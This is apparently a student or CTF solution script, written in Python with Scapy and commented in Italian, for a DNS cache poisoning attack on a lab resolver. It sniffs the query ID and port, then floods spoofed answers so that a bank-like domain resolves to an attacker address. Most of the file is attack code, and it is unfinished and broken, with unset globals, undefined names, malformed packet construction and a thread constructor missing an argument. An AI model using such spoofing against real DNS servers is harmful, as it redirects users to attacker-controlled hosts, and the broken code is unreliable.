'''
- For the attack to succeed, you have to parse a queryid number from a query made to badguy.ru. 
  You can extract a query by programming a small udp server listening on badguyDNSport on your attacking machine. 
  Hence, whenever you do a query for badguy.ru, the vulnDNS serve will make a recursive query to badguy.ru 
  (which is your machine)
- Remember that you should also have another UDP server listening for the FLAG on port 1337 
  (the flag is sent only if the attack is successful).
- For any issue look at the dns.log file, which logs all queries received as well as successfull attacks.
- If possible write everything under one program only so that all is automated for the attack 
  (parsing of queryID, cache poisoning and reception of the FLAG).
  '''

from threading import Thread
import time
from random import randint
from scapy.layers.inet import *
from scapy.layers.dns import *
from scapy.all import *

Q_ID = 0                # query ID globale
PORT_NUMBER = 0         # porta da catturare


GOAL = 0                # va a 1 se riesco nell'attacco      TODO
RESTART = 0             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1

class FirstThread(Thread):

        def __init__(self, name, job, flood):
                Thread.__init__(self)
                self.name = name
                self.job = job
                self.flood = flood

        def run(self):
                print ("Thread '" + self.name + "' avviato")
                # time.sleep(self.durata)

                if self.job == 0:                                                       # sniffer
                        sniffer_job()
                        print ("Thread '" + self.name + "' terminato")

                if self.job == 1:                                                       # sender
                        time.sleep(1)
                        sender_job()
                        print ("Thread '" + self.name + "' terminato")

                if self.job == 2:                                                       # bad client
                        sender_job_2()
                        print ("Thread '" + self.name + "' terminato")

                if self.job == 3:                                                       # flooder
                        flooding_job(self.flood)



def sender_job():
        '''
        invio la prima query DNS per badguy.ru
        :return:
        '''
        send(IP(dst="192.168.56.101") / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
        #pkt = sr1(IP(dst="192.168.56.101") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
        # p.show()


def sniffer_job():
        '''
        sniffo la query ricorsiva fatta all'host (server autoritativo per badguy.ru)
        catturo query ID e numero di porta
        :return:
        '''
        #pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", prn=lambda x: x.summary())
        pkts = sniff(count=4, timeout=2, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", lfilter=lambda pkt: pkt.haslayer(DNS))

        print ('trovati ' + str(len(pkts)) + ' pacchetti')
        qID = pkts[0].getlayer(DNS).id
        port = pkts[0].getlayer(UDP).sport
        print ('found qID: ' + str(hex(qID)))
        print ('found port: ' + str(port))

def sender_job_2():
        '''
        chiede alla vittima la query per bankofallan.co.uk, sincronizzato con i thread floodders
        :return:
        '''

        send(IP(dst="192.168.56.101") / UDP() / DNS(rd=1, qd=DNSQR(qname="bankofallan.co.uk")))


def flooding_job(passo):
        '''
        manda pacchetti in base al passo
        :param passo:
        :return:
        '''

        # TODO [FABIO] finire

        '''
        # build the packet
            pkt = IP(dst=targetdns, src=targetip) / UDP(sport=53, dport=clientSrcPort) / \
                  DNS(id=clientDNSQueryID, qr=1L, opcode='QUERY', aa=0L, tc=0L, rd=0L, ra=1L, z=0L, rcode='ok', qdcount=1, ancount=1,
                      nscount=1, arcount=2,
                      qd=(DNSQR(qname=clientDNSQuery, qtype='A', qclass='IN')),
                      an=(DNSQR(qname=clientDNSQuery, qtype='A', qclass='IN')),
                      ns=(NDSRR(rrname=domain, type='NS', rclass='IN', ttl=60000, rdlen=24, rdata=dnsspoof)),
                      ar=(DNSRR(rrname=dnsspoof, type='A', rclass='IN', ttl=60000, rdlen=4, rdata=targetip))/
                         DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
        
            # lenght and checksum
            pkt.getlayer(UDP).len = IP(str(pkt)).len - 20
            pkt[UDP].post_build(str(pkt([UDP]), str(pkt[UDP].payload)))
        
            print('sending spoof packet')
            send(pkt, verbose=0)
        '''
        for count in range(Q_ID+1+(passo*125),Q_ID+((passo+1)*125)):
                # mando pacchetti con il qID che varia
                send(IP(dst="192.168.56.101", src="10.0.0.1") / UDP(sport=53, dport=PORT_NUMBER) / DNS(rd=1, qd=DNS(qname="badguy.ru")))
                # build the packet
                pkt = IP(dst="192.168.56.101", src="10.0.0.1") / UDP(sport=53, dport=PORT_NUMBER) / \
                      DNS(id=Q_ID, qr=1L, opcode='QUERY', aa=0L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                          qdcount=1, ancount=1,
                          nscount=0, arcount=0,
                          qd=(DNSQR(qname='bankofallan.co.uk', qtype='A', qclass='IN')),
                          an=None,
                          ns=(DNSRR(rrname=domain, type='NS', rclass='IN', ttl=60000, rdlen=24, rdata=dnsspoof)),
                          ar=(DNSRR(rrname=dnsspoof, type='A', rclass='IN', ttl=60000, rdlen=4, rdata=targetip)) /
                             DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))


############################ MAIN ##################à
# TODO start del thread in ascolto su 1337 prima degli altri

def main():
        '''

        - il bad_client e i 4 flooders devono partire sulla stessa condizione (cioè Q_ID != 0 and PORT_NUMBER != 0)
        -
        :return:
        '''
        while GOAL == 0:
                RESTART = 0

                # Creazione dei thread
                sniffer_thread = FirstThread(name="sniffer", job=0)
                first_sender_thread = FirstThread(name="first sender", job=1)
                bad_client_thread = FirstThread(name="bad client", job=2)

                flooder_0 = FirstThread(name="flood0", job=3, flood=0)
                flooder_1 = FirstThread(name="flood1", job=3, flood=1)
                flooder_2 = FirstThread(name="flood2", job=3, flood=2)
                flooder_3 = FirstThread(name="flood3", job=3, flood=3)
                flooder_4 = FirstThread(name="flood3", job=3, flood=4)
                flooder_5 = FirstThread(name="flood3", job=3, flood=5)
                flooder_6 = FirstThread(name="flood3", job=3, flood=6)
                flooder_7 = FirstThread(name="flood3", job=3, flood=7)

                # Avvio dei thread
                sniffer_thread.start()
                first_sender_thread.start()

                '''if (Q_ID == 0 or PORT_NUMBER == 0):
                        print '[MAIN] error on qID or port'
                        pass'''

                bad_client_thread.start()




                sniffer_thread.join()
                first_sender_thread.join()
                bad_client_thread.join()

